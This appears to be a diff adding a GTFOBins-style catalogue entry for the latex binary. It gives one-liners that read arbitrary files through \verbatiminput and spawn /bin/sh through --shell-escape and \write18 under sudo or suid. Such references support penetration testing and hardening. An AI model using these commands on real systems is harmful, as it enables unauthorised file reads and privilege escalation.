@@ -1,0 +1,21 @@
+---
+functions:
+  file-read:
+  - code: |-
+      latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+      strings texput.dvi
+    comment: |-
+      The read file will be part of the PDF output.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      latex --shell-escape '\immediate\write18{/bin/sh}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
